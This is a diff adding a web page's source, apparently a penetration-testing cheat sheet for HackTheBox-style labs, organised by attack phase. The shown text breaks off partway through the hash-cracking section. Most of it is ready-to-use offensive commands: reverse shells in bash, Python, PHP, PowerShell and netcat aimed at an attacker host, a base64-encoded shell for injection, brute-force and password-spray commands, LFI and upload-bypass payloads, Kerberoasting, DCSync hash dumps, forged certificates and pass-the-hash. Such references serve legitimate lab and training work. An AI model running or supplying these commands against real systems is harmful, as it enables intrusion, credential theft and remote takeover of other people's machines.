@@ -1,0 +1,1182 @@
+---
+import Layout from '~/layouts/Layout.astro'
+
+// ── Data ──────────────────────────────────────────────────────────────────
+// Organized by pentest phase, not by tool. Each command has:
+//   label   — what it does in plain English
+//   cmd     — the actual command ({PLACEHOLDER} for variables)
+//   note    — optional extra context (when to use, caveats, follow-up)
+//   tags    — for filtering (tool name, technique, etc.)
+
+const phases = [
+  // ── PHASE 1 ─────────────────────────────────────────────────────────────
+  {
+    id: 'recon',
+    phase: 'Phase 1',
+    title: 'Reconnaissance',
+    description: 'Map the attack surface before touching anything. Ports, services, DNS, web directories.',
+    color: 'blue',
+    icon: `<svg viewBox="0 0 20 20" fill="currentColor" class="w-5 h-5"><path d="M10 12.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5z"/><path fill-rule="evenodd" d="M.664 10.59a1.651 1.651 0 010-1.186A10.004 10.004 0 0110 3c4.257 0 7.893 2.66 9.336 6.41.147.381.146.804 0 1.186A10.004 10.004 0 0110 17c-4.257 0-7.893-2.66-9.336-6.41zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd"/></svg>`,
+    groups: [
+      {
+        title: 'Port Scanning',
+        entries: [
+          {
+            label: 'Full scan — all ports, versions, default scripts',
+            cmd: 'nmap -sV -sC -p- --min-rate 5000 -oN nmap_full.txt {TARGET}',
+            note: 'Best first scan. -oN saves output. Takes ~2 min on HTB.',
+            tags: ['nmap'],
+          },
+          {
+            label: 'Quick scan — top 1000 ports',
+            cmd: 'nmap -sV -sC --min-rate 5000 -oN nmap_quick.txt {TARGET}',
+            note: 'Run this first while the full scan runs in background.',
+            tags: ['nmap'],
+          },
+          {
+            label: 'UDP scan — top 200 ports',
+            cmd: 'nmap -sU --top-ports 200 -oN nmap_udp.txt {TARGET}',
+            note: 'Slow but catches SNMP (161), TFTP (69), DNS (53).',
+            tags: ['nmap'],
+          },
+          {
+            label: 'Targeted scripts on open ports',
+            cmd: 'nmap --script vuln,safe -p {PORTS} -oN nmap_scripts.txt {TARGET}',
+            note: 'Run after identifying open ports.',
+            tags: ['nmap'],
+          },
+          {
+            label: 'SMB-specific scripts',
+            cmd: 'nmap --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 -p 445 {TARGET}',
+            tags: ['nmap', 'smb'],
+          },
+        ],
+      },
+      {
+        title: 'Web Enumeration',
+        entries: [
+          {
+            label: 'Directory brute-force',
+            cmd: 'gobuster dir -u http://{TARGET}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak -o gobuster.txt',
+            note: 'Add -k to ignore SSL errors. Add -b 403,404 to filter noise.',
+            tags: ['gobuster', 'web'],
+          },
+          {
+            label: 'Fast directory brute-force',
+            cmd: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://{TARGET}/FUZZ -o ffuf.txt -of md',
+            note: 'Add -fs {SIZE} to filter by response size.',
+            tags: ['ffuf', 'web'],
+          },
+          {
+            label: 'Virtual host brute-force',
+            cmd: 'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET}/ -H "Host: FUZZ.{DOMAIN}" -fs {SIZE}',
+            note: 'Find the right -fs value from a known-bad response first.',
+            tags: ['ffuf', 'vhost', 'web'],
+          },
+          {
+            label: 'Recursive directory scan',
+            cmd: 'feroxbuster --url http://{TARGET} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3 -x php,html -o ferox.txt',
+            tags: ['feroxbuster', 'web'],
+          },
+          {
+            label: 'Parameter discovery',
+            cmd: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://{TARGET}/page?FUZZ=test" -fs {SIZE}',
+            tags: ['ffuf', 'web'],
+          },
+          {
+            label: 'Technology fingerprinting',
+            cmd: 'whatweb -v http://{TARGET}',
+            note: 'Identifies CMS, frameworks, server version.',
+            tags: ['whatweb', 'web'],
+          },
+        ],
+      },
+      {
+        title: 'DNS',
+        entries: [
+          {
+            label: 'Zone transfer — dump all records',
+            cmd: 'dig axfr {DOMAIN} @{TARGET}',
+            note: 'Works when zone transfer is misconfigured. Reveals all subdomains.',
+            tags: ['dns', 'dig'],
+          },
+          {
+            label: 'Subdomain brute-force',
+            cmd: 'gobuster dns -d {DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r {TARGET}',
+            tags: ['gobuster', 'dns'],
+          },
+          {
+            label: 'All DNS records',
+            cmd: 'dig any {DOMAIN} @{TARGET}',
+            tags: ['dns', 'dig'],
+          },
+          {
+            label: 'Reverse DNS lookup',
+            cmd: 'dig -x {TARGET}',
+            note: 'Reveals hostname from IP — sometimes leaks internal domain names.',
+            tags: ['dns', 'dig'],
+          },
+        ],
+      },
+    ],
+  },
+
+  // ── PHASE 2 ─────────────────────────────────────────────────────────────
+  {
+    id: 'enum',
+    phase: 'Phase 2',
+    title: 'Service Enumeration',
+    description: 'Deep-dive into specific services. SMB, LDAP, RPC, databases, and protocols.',
+    color: 'violet',
+    icon: `<svg viewBox="0 0 20 20" fill="currentColor" class="w-5 h-5"><path fill-rule="evenodd" d="M2 5a2 2 0 012-2h12a2 2 0 012 2v2a2 2 0 01-2 2H4a2 2 0 01-2-2V5zm14 1a1 1 0 11-2 0 1 1 0 012 0zM2 13a2 2 0 012-2h12a2 2 0 012 2v2a2 2 0 01-2 2H4a2 2 0 01-2-2v-2zm14 1a1 1 0 11-2 0 1 1 0 012 0z" clip-rule="evenodd"/></svg>`,
+    groups: [
+      {
+        title: 'SMB Enumeration',
+        entries: [
+          {
+            label: 'List shares — null/anonymous session',
+            cmd: 'smbclient -L //{TARGET} -N',
+            note: '-N means no password. Works when null sessions are allowed.',
+            tags: ['smb', 'smbclient'],
+          },
+          {
+            label: 'List shares — with credentials',
+            cmd: 'smbclient -L //{TARGET} -U "{DOMAIN}\\{USER}%{PASS}"',
+            tags: ['smb', 'smbclient'],
+          },
+          {
+            label: 'Connect and browse a share',
+            cmd: 'smbclient //{TARGET}/{SHARE} -U "{USER}%{PASS}"',
+            note: 'Use get {FILE} to download, ls to list, recurse + mget * to grab everything.',
+            tags: ['smb', 'smbclient'],
+          },
+          {
+            label: 'Enumerate shares, users, policies (NetExec)',
+            cmd: 'netexec smb {TARGET} -u {USER} -p {PASS} --shares --users --pass-pol',
+            tags: ['netexec', 'smb'],
+          },
+          {
+            label: 'RID brute-force — enumerate users without creds',
+            cmd: 'netexec smb {TARGET} -u anonymous -p "" --rid-brute',
+            note: 'Works against many AD environments with null session.',
+            tags: ['netexec', 'smb'],
+          },
+          {
+            label: 'Spider and index all share contents',
+            cmd: 'netexec smb {TARGET} -u {USER} -p {PASS} -M spider_plus -o OUTPUT_FOLDER=./smb_loot',
+            note: 'Downloads a JSON index of everything readable on all shares.',
+            tags: ['netexec', 'smb'],
+          },
+          {
+            label: 'Full enumeration (enum4linux)',
+            cmd: 'enum4linux -a {TARGET}',
+            note: 'Wraps smbclient, rpcclient, nmblookup into one output.',
+            tags: ['enum4linux', 'smb'],
+          },
+        ],
+      },
+      {
+        title: 'RPC',
+        entries: [
+          {
+            label: 'Open null session',
+            cmd: 'rpcclient -U "" -N {TARGET}',
+            tags: ['rpcclient', 'rpc'],
+          },
+          {
+            label: 'Enumerate domain users',
+            cmd: 'rpcclient -U "" -N {TARGET} -c "enumdomusers"',
+            tags: ['rpcclient', 'rpc'],
+          },
+          {
+            label: 'Get user details by RID',
+            cmd: 'rpcclient -U "" -N {TARGET} -c "queryuser 0x{RID}"',
+            tags: ['rpcclient', 'rpc'],
+          },
+          {
+            label: 'Enumerate domain groups',
+            cmd: 'rpcclient -U "" -N {TARGET} -c "enumdomgroups"',
+            tags: ['rpcclient', 'rpc'],
+          },
+          {
+            label: 'Get group members',
+            cmd: 'rpcclient -U "" -N {TARGET} -c "querygroupmem 0x{RID}"',
+            tags: ['rpcclient', 'rpc'],
+          },
+        ],
+      },
+      {
+        title: 'LDAP',
+        entries: [
+          {
+            label: 'Find the base DN',
+            cmd: 'ldapsearch -H ldap://{TARGET} -x -s base namingcontexts',
+            note: 'Always run this first to discover the domain base DN.',
+            tags: ['ldapsearch', 'ldap'],
+          },
+          {
+            label: 'Enumerate all users',
+            cmd: 'ldapsearch -H ldap://{TARGET} -x -b "DC={DOMAIN},DC={TLD}" "(objectClass=person)" sAMAccountName description memberOf',
+            note: 'Look at the description field — passwords are often stored there.',
+            tags: ['ldapsearch', 'ldap'],
+          },
+          {
+            label: 'Authenticated LDAP query',
+            cmd: 'ldapsearch -H ldap://{TARGET} -x -D "{USER}@{DOMAIN}" -w {PASS} -b "DC={DOMAIN},DC={TLD}" "(objectClass=*)"',
+            tags: ['ldapsearch', 'ldap'],
+          },
+          {
+            label: 'Find accounts with password in description',
+            cmd: 'ldapsearch -H ldap://{TARGET} -x -b "DC={DOMAIN},DC={TLD}" "(description=*)" sAMAccountName description',
+            tags: ['ldapsearch', 'ldap'],
+          },
+        ],
+      },
+      {
+        title: 'Other Services',
+        entries: [
+          {
+            label: 'SNMP — enumerate with community string',
+            cmd: 'snmpwalk -v2c -c public {TARGET}',
+            note: 'Try: public, private, community, manager. Leaks users, processes, config.',
+            tags: ['snmp'],
+          },
+          {
+            label: 'SMTP — enumerate users',
+            cmd: 'smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {TARGET}',
+            tags: ['smtp'],
+          },
+          {
+            label: 'MySQL — login and enumerate',
+            cmd: 'mysql -h {TARGET} -u {USER} -p{PASS} -e "show databases; use {DB}; show tables;"',
+            tags: ['mysql', 'database'],
+          },
+          {
+            label: 'MSSQL — login with impacket',
+            cmd: 'impacket-mssqlclient {DOMAIN}/{USER}:{PASS}@{TARGET}',
+            note: 'Add -windows-auth for domain accounts.',
+            tags: ['mssql', 'database', 'impacket'],
+          },
+          {
+            label: 'FTP — anonymous login',
+            cmd: 'ftp {TARGET}',
+            note: 'Try username: anonymous, password: (blank). Then ls -la and mget *.',
+            tags: ['ftp'],
+          },
+        ],
+      },
+    ],
+  },
+
+  // ── PHASE 3 ─────────────────────────────────────────────────────────────
+  {
+    id: 'foothold',
+    phase: 'Phase 3',
+    title: 'Foothold',
+    description: 'Get your first shell. Password attacks, web exploitation, and initial access techniques.',
+    color: 'amber',
+    icon: `<svg viewBox="0 0 20 20" fill="currentColor" class="w-5 h-5"><path fill-rule="evenodd" d="M3 3a1 1 0 000 2v8a2 2 0 002 2h2.586l-1.293 1.293a1 1 0 101.414 1.414L10 15.414l2.293 2.293a1 1 0 001.414-1.414L12.414 15H15a2 2 0 002-2V5a1 1 0 100-2H3zm11 4a1 1 0 10-2 0v4a1 1 0 102 0V7zm-3 1a1 1 0 10-2 0v3a1 1 0 102 0V8zM8 9a1 1 0 00-2 0v2a1 1 0 102 0V9z" clip-rule="evenodd"/></svg>`,
+    groups: [
+      {
+        title: 'Password Attacks',
+        entries: [
+          {
+            label: 'SSH brute-force',
+            cmd: 'hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET} -t 4',
+            note: '-t 4 limits threads to avoid lockout. Use -L for a user list.',
+            tags: ['hydra', 'brute-force'],
+          },
+          {
+            label: 'HTTP form brute-force',
+            cmd: 'hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"',
+            note: 'Adjust the form fields and failure string to match the target.',
+            tags: ['hydra', 'brute-force', 'web'],
+          },
+          {
+            label: 'SMB password spray',
+            cmd: 'netexec smb {TARGET} -u users.txt -p {PASS} --continue-on-success',
+            note: 'Use one password at a time to avoid lockout. Ideal with domain userlist.',
+            tags: ['netexec', 'smb', 'password-spray'],
+          },
+          {
+            label: 'Kerbrute — user enumeration',
+            cmd: 'kerbrute userenum --dc {TARGET} -d {DOMAIN} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt',
+            note: 'Valid users return a pre-auth error, invalid ones get nothing.',
+            tags: ['kerbrute', 'kerberos'],
+          },
+          {
+            label: 'Kerbrute — password spray',
+            cmd: 'kerbrute passwordspray --dc {TARGET} -d {DOMAIN} users.txt "{PASS}"',
+            tags: ['kerbrute', 'kerberos', 'password-spray'],
+          },
+        ],
+      },
+      {
+        title: 'Web Exploitation',
+        entries: [
+          {
+            label: 'SQLi — automated scan',
+            cmd: 'sqlmap -u "http://{TARGET}/page?id=1" --dbs --batch',
+            note: 'Add --cookie="session=..." for authenticated scans. Add --level=5 --risk=3 for deeper.',
+            tags: ['sqlmap', 'sqli', 'web'],
+          },
+          {
+            label: 'SQLi — dump specific table',
+            cmd: 'sqlmap -u "http://{TARGET}/page?id=1" -D {DB} -T {TABLE} --dump --batch',
+            tags: ['sqlmap', 'sqli', 'web'],
+          },
+          {
+            label: 'LFI — test for path traversal',
+            cmd: 'curl "http://{TARGET}/page?file=../../../../etc/passwd"',
+            note: 'Try with and without URL encoding. Also try PHP wrappers: ?file=php://filter/...',
+            tags: ['lfi', 'web', 'curl'],
+          },
+          {
+            label: 'LFI — PHP filter wrapper (read source)',
+            cmd: 'curl "http://{TARGET}/page?file=php://filter/convert.base64-encode/resource={FILE}" | base64 -d',
+            tags: ['lfi', 'web'],
+          },
+          {
+            label: 'SSRF — probe internal services',
+            cmd: 'curl "http://{TARGET}/fetch?url=http://127.0.0.1:{PORT}"',
+            note: 'Iterate ports to find internal services. Try 80, 443, 8080, 8443, 6379, 3306.',
+            tags: ['ssrf', 'web'],
+          },
+          {
+            label: 'File upload — bypass extension check',
+            cmd: 'curl -F "file=@shell.php;filename=shell.php.jpg" http://{TARGET}/upload',
+            note: 'Also try: shell.phtml, shell.php5, shell.phar, or adding null bytes.',
+            tags: ['file-upload', 'web'],
+          },
+        ],
+      },
+      {
+        title: 'Reverse Shells',
+        entries: [
+          {
+            label: 'Bash — TCP reverse shell',
+            cmd: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
+            tags: ['reverse-shell', 'bash'],
+          },
+          {
+            label: 'Bash — TCP (base64 encoded for injection)',
+            cmd: 'echo "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1" | base64 -w0',
+            note: 'Decode + pipe to bash on target: echo {B64} | base64 -d | bash',
+            tags: ['reverse-shell', 'bash'],
+          },
+          {
+            label: 'Python 3 — reverse shell',
+            cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            tags: ['reverse-shell', 'python'],
+          },
+          {
+            label: 'PHP — reverse shell (one-liner)',
+            cmd: "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+            tags: ['reverse-shell', 'php'],
+          },
+          {
+            label: 'PowerShell — reverse shell',
+            cmd: 'powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sb3,0,$sb3.Length);$stream.Flush()};$client.Close()"',
+            tags: ['reverse-shell', 'powershell', 'windows'],
+          },
+          {
+            label: 'Netcat — reverse shell (with -e)',
+            cmd: 'nc -e /bin/bash {LHOST} {LPORT}',
+            tags: ['reverse-shell', 'nc'],
+          },
+          {
+            label: 'Netcat — reverse shell (without -e)',
+            cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f',
+            note: 'Works on systems without -e support (OpenBSD netcat).',
+            tags: ['reverse-shell', 'nc'],
+          },
+        ],
+      },
+      {
+        title: 'Shell Upgrade',
+        entries: [
+          {
+            label: 'Step 1 — Spawn PTY with Python',
+            cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+            note: 'Run this first inside your dumb shell.',
+            tags: ['shell-upgrade'],
+          },
+          {
+            label: 'Step 2 — Background and fix terminal',
+            cmd: 'Ctrl+Z  →  stty raw -echo; fg  →  reset',
+            note: 'stty raw -echo runs in YOUR local terminal, not the target.',
+            tags: ['shell-upgrade'],
+          },
+          {
+            label: 'Step 3 — Set environment',
+            cmd: 'export TERM=xterm; export SHELL=bash',
+            tags: ['shell-upgrade'],
+          },
+          {
+            label: 'Script method (alternative)',
+            cmd: 'script /dev/null -c bash',
+            note: 'Simpler but may not fully fix arrow keys.',
+            tags: ['shell-upgrade'],
+          },
+        ],
+      },
+    ],
+  },
+
+  // ── PHASE 4 ─────────────────────────────────────────────────────────────
+  {
+    id: 'ad',
+    phase: 'Phase 4',
+    title: 'Active Directory',
+    description: 'Kerberos attacks, BloodHound, AD CS exploitation, and lateral movement through the domain.',
+    color: 'rose',
+    icon: `<svg viewBox="0 0 20 20" fill="currentColor" class="w-5 h-5"><path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4z" clip-rule="evenodd"/></svg>`,
+    groups: [
+      {
+        title: 'Kerberos Attacks',
+        entries: [
+          {
+            label: 'AS-REP Roasting — no pre-auth accounts',
+            cmd: 'impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -no-pass -dc-ip {TARGET} -outputfile asrep_hashes.txt',
+            note: 'Crack output with: hashcat -m 18200 asrep_hashes.txt rockyou.txt',
+            tags: ['asrep', 'kerberos', 'impacket'],
+          },
+          {
+            label: 'Kerberoasting — SPN service ticket request',
+            cmd: 'impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {TARGET} -outputfile kerberoast_hashes.txt',
+            note: 'Crack output with: hashcat -m 13100 kerberoast_hashes.txt rockyou.txt',
+            tags: ['kerberoasting', 'kerberos', 'impacket'],
+          },
+          {
+            label: 'Kerberoasting via NetExec',
+            cmd: 'netexec ldap {TARGET} -u {USER} -p {PASS} --kerberoasting kerberoast.txt',
+            tags: ['kerberoasting', 'kerberos', 'netexec'],
+          },
+        ],
+      },
+      {
+        title: 'BloodHound',
+        entries: [
+          {
+            label: 'Collect all data — password auth',
+            cmd: 'bloodhound-python -c all -u {USER} -p {PASS} -d {DOMAIN} -dc {DC_HOSTNAME} -ns {TARGET}',
+            note: 'Creates JSON files. Start neo4j, open BloodHound, then drag-drop the ZIPs.',
+            tags: ['bloodhound'],
+          },
+          {
+            label: 'Collect via Kerberos ticket',
+            cmd: 'bloodhound-python -c all -u {USER} -k -d {DOMAIN} -ns {TARGET} --auth-method kerberos',
+            tags: ['bloodhound', 'kerberos'],
+          },
+          {
+            label: 'Key BloodHound queries',
+            cmd: 'MATCH (n:User {owned:true}) RETURN n  |  Shortest path to Domain Admin  |  Find all AS-REP Roastable users',
+            note: 'Use the pre-built "Analysis" queries in BloodHound GUI before writing custom Cypher.',
+            tags: ['bloodhound'],
+          },
+        ],
+      },
+      {
+        title: 'AD CS (Certificate Services)',
+        entries: [
+          {
+            label: 'Find vulnerable certificate templates',
+            cmd: 'certipy-ad find -vulnerable -u {USER}@{DOMAIN} -p {PASS} -dc-ip {TARGET}',
+            note: 'Look for ESC1–ESC8 vulnerabilities in the output.',
+            tags: ['certipy', 'adcs'],
+          },
+          {
+            label: 'ESC1 — request cert as another user',
+            cmd: 'certipy-ad req -u {USER}@{DOMAIN} -p {PASS} -ca {CA_NAME} -template {TEMPLATE} -upn administrator@{DOMAIN} -dc-ip {TARGET}',
+            tags: ['certipy', 'adcs', 'esc1'],
+          },
+          {
+            label: 'Authenticate using certificate (get NTLM hash)',
+            cmd: 'certipy-ad auth -pfx administrator.pfx -dc-ip {TARGET}',
+            note: 'Outputs the NT hash for the account. Use with pass-the-hash.',
+            tags: ['certipy', 'adcs'],
+          },
+          {
+            label: 'Shadow credentials attack',
+            cmd: 'certipy-ad shadow auto -username {USER}@{DOMAIN} -hashes :{HASH} -account {TARGET_USER} -dc-ip {TARGET}',
+            note: 'Requires WriteProperty on the target account\'s msDS-KeyCredentialLink.',
+            tags: ['certipy', 'adcs', 'shadow-credentials'],
+          },
+          {
+            label: 'Forge golden certificate (ESC3/ESC6)',
+            cmd: 'certipy-ad forge -ca-pfx ca.pfx -upn administrator@{DOMAIN} -subject "CN=Administrator,CN=Users,DC={DOMAIN},DC={TLD}" -out admin_forged.pfx',
+            tags: ['certipy', 'adcs'],
+          },
+        ],
+      },
+      {
+        title: 'Lateral Movement',
+        entries: [
+          {
+            label: 'Evil-WinRM — remote shell (password)',
+            cmd: 'evil-winrm -i {TARGET} -u {USER} -p {PASS}',
+            note: 'WinRM must be enabled on target (port 5985/5986).',
+            tags: ['evil-winrm', 'lateral-movement'],
+          },
+          {
+            label: 'Evil-WinRM — remote shell (NTLM hash)',
+            cmd: 'evil-winrm -i {TARGET} -u {USER} -H {NTLM_HASH}',
+            tags: ['evil-winrm', 'lateral-movement', 'pass-the-hash'],
+          },
+          {
+            label: 'PSExec — SYSTEM shell (hash)',
+            cmd: 'impacket-psexec {DOMAIN}/administrator@{TARGET} -hashes :{NTLM_HASH}',
+            tags: ['impacket', 'lateral-movement', 'pass-the-hash'],
+          },
+          {
+            label: 'WMIExec — shell without writing to disk',
+            cmd: 'impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{TARGET}',
+            tags: ['impacket', 'lateral-movement'],
+          },
+          {
+            label: 'Pass-the-Ticket — inject TGT',
+            cmd: 'impacket-ticketer -nthash {NTLM_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} administrator',
+            note: 'Then: export KRB5CCNAME=administrator.ccache and use -k -no-pass with tools.',
+            tags: ['kerberos', 'pass-the-ticket', 'impacket'],
+          },
+        ],
+      },
+      {
+        title: 'Domain Dominance',
+        entries: [
+          {
+            label: 'DCSync — replicate all hashes',
+            cmd: 'impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{TARGET}',
+            note: 'Requires Replicating Directory Changes permissions (Domain Admin or delegated).',
+            tags: ['dcsync', 'impacket', 'domain-dominance'],
+          },
+          {
+            label: 'DCSync — from local NTDS.dit',
+            cmd: 'impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL',
+            note: 'After downloading NTDS.dit and SYSTEM hive from DC.',
+            tags: ['dcsync', 'impacket', 'domain-dominance'],
+          },
+          {
+            label: 'Pass-the-Hash — verify admin access',
+            cmd: 'netexec smb {TARGET} -u administrator -H {NTLM_HASH}',
+            note: 'Look for (Pwn3d!) in output confirming local admin.',
+            tags: ['pass-the-hash', 'netexec'],
+          },
+        ],
+      },
+    ],
+  },
+
+  // ── PHASE 5 ─────────────────────────────────────────────────────────────
+  {
+    id: 'privesc',
+    phase: 'Phase 5',
+    title: 'Privilege Escalation',
+    description: 'Escalate from low-privilege user to root or SYSTEM. Linux and Windows techniques.',
+    color: 'orange',
+    icon: `<svg viewBox="0 0 20 20" fill="currentColor" class="w-5 h-5"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.857-9.809a.75.75 0 00-1.214-.882l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z" clip-rule="evenodd"/></svg>`,
+    groups: [
+      {
+        title: 'Linux — Enumeration',
+        entries: [
+          {
+            label: 'LinPEAS — automated enumeration',
+            cmd: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>&1 | tee linpeas.txt',
+            note: 'Focus on yellow (interesting) and red (critical) findings.',
+            tags: ['linpeas', 'linux', 'privesc'],
+          },
+          {
+            label: 'Check sudo permissions',
+            cmd: 'sudo -l',
+            note: 'Check GTFOBins for anything listed. Even (ALL : ALL) NOPASSWD: /usr/bin/vim is exploitable.',
+            tags: ['sudo', 'linux', 'privesc'],
+          },
+          {
+            label: 'Find SUID binaries',
+            cmd: 'find / -perm -4000 -type f 2>/dev/null',
+            note: 'Compare against GTFOBins: https://gtfobins.github.io/',
+            tags: ['suid', 'linux', 'privesc'],
+          },
+          {
+            label: 'Check capabilities',
+            cmd: 'getcap -r / 2>/dev/null',
+            note: 'cap_setuid+ep on python/perl/ruby = instant root.',
+            tags: ['capabilities', 'linux', 'privesc'],
+          },
+          {
+            label: 'Find writable files owned by root',
+            cmd: 'find / -writable -user root -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null',
+            tags: ['linux', 'privesc'],
+          },
+          {
+            label: 'Check cron jobs',
+            cmd: 'cat /etc/crontab; ls -la /etc/cron.*/',
+            note: 'Look for writable scripts run as root.',
+            tags: ['cron', 'linux', 'privesc'],
+          },
+          {
+            label: 'Check running processes',
+            cmd: 'ps auxwww | grep root',
+            tags: ['linux', 'privesc'],
+          },
+          {
+            label: 'Find config files with passwords',
+            cmd: "grep -rlni 'password\\|passwd\\|secret\\|key\\|token' /etc /opt /var/www 2>/dev/null",
+            tags: ['linux', 'privesc'],
+          },
+        ],
+      },
+      {
+        title: 'Windows — Enumeration',
+        entries: [
+          {
+            label: 'WinPEAS — automated enumeration',
+            cmd: '.\\winPEAS.exe quiet > winpeas.txt',
+            note: 'Upload first. Use evil-winrm upload winPEAS.exe. Look for orange/red findings.',
+            tags: ['winpeas', 'windows', 'privesc'],
+          },
+          {
+            label: 'Check current privileges',
+            cmd: 'whoami /priv',
+            note: 'SeImpersonatePrivilege → GodPotato/PrintSpoofer. SeBackupPrivilege → NTDS dump.',
+            tags: ['windows', 'privesc'],
+          },
+          {
+            label: 'Check group membership',
+            cmd: 'whoami /groups',
+            note: 'Backup Operators group = can dump NTDS.dit.',
+            tags: ['windows', 'privesc'],
+          },
+          {
+            label: 'Find unquoted service paths',
+            cmd: 'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
+            note: 'If path has spaces and no quotes, you can plant a binary.',
+            tags: ['windows', 'privesc', 'services'],
+          },
+          {
+            label: 'Check AlwaysInstallElevated',
+            cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
+            note: 'If both HKLM and HKCU return 1, you can install MSI as SYSTEM.',
+            tags: ['windows', 'privesc', 'registry'],
+          },
+          {
+            label: 'Find passwords in registry',
+            cmd: 'reg query HKLM /f password /t REG_SZ /s',
+            tags: ['windows', 'privesc', 'registry'],
+          },
+          {
+            label: 'Stored credentials',
+            cmd: 'cmdkey /list',
+            note: 'Stored creds → runas /user:{USER} /savecred "{CMD}"',
+            tags: ['windows', 'privesc'],
+          },
+        ],
+      },
+    ],
+  },
+
+  // ── PHASE 6 ─────────────────────────────────────────────────────────────
+  {
+    id: 'post',
+    phase: 'Phase 6',
+    title: 'Post Exploitation',
+    description: 'After you have a shell — transfer files, crack hashes, establish persistence, pivot.',
+    color: 'green',
+    icon: `<svg viewBox="0 0 20 20" fill="currentColor" class="w-5 h-5"><path d="M3 12v3c0 1.657 3.134 3 7 3s7-1.343 7-3v-3c0 1.657-3.134 3-7 3s-7-1.343-7-3z"/><path d="M3 7v3c0 1.657 3.134 3 7 3s7-1.343 7-3V7c0 1.657-3.134 3-7 3S3 8.657 3 7z"/><path d="M17 5c0 1.657-3.134 3-7 3S3 6.657 3 5s3.134-3 7-3 7 1.343 7 3z"/></svg>`,
+    groups: [
+      {
+        title: 'File Transfer',
+        entries: [
+          {
+            label: 'Python HTTP server (on attacker)',
+            cmd: 'python3 -m http.server 8080',
+            note: 'Serve files from current directory. Target downloads with wget/curl.',
+            tags: ['file-transfer'],
+          },
+          {
+            label: 'Download on Linux target',
+            cmd: 'wget http://{LHOST}:8080/{FILE} -O /tmp/{FILE}',
+            tags: ['file-transfer', 'linux'],
+          },
+          {
+            label: 'Download on Windows target (PowerShell)',
+            cmd: 'Invoke-WebRequest -Uri "http://{LHOST}:8080/{FILE}" -OutFile "C:\\Temp\\{FILE}"',
+            note: 'Short form: iwr "http://{LHOST}:8080/{FILE}" -o C:\\Temp\\{FILE}',
+            tags: ['file-transfer', 'windows', 'powershell'],
+          },
+          {
+            label: 'Download on Windows target (certutil)',
+            cmd: 'certutil -urlcache -split -f "http://{LHOST}:8080/{FILE}" C:\\Temp\\{FILE}',
+            note: 'Works when PowerShell is restricted.',
+            tags: ['file-transfer', 'windows'],
+          },
+          {
+            label: 'SMB share for transfer (on attacker)',
+            cmd: 'impacket-smbserver share . -smb2support -username {USER} -password {PASS}',
+            note: 'Then on Windows: copy \\\\{LHOST}\\share\\{FILE} C:\\Temp\\',
+            tags: ['file-transfer', 'impacket', 'smb'],
+          },
+          {
+            label: 'Evil-WinRM upload/download',
+            cmd: 'upload /path/to/local/file.exe C:\\Temp\\file.exe\ndownload C:\\path\\to\\remote\\file',
+            note: 'Only works inside an evil-winrm session.',
+            tags: ['file-transfer', 'evil-winrm'],
+          },
+        ],
+      },
+      {
+        title: 'Hash Cracking',
+        entries: [
+          {
+            label: 'NTLM hash (-m 1000)',
+            cmd: 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O',
+            tags: ['hashcat', 'cracking'],
+          },
+          {
+            label: 'NTLMv2 / Net-NTLMv2 (-m 5600)',
+            cmd: 'hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -O',
+            tags: ['hashcat', 'cracking'],
+          },
+          {
+            label: 'Kerberoast ticket (-m 13100)',
+            cmd: 'hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -O',
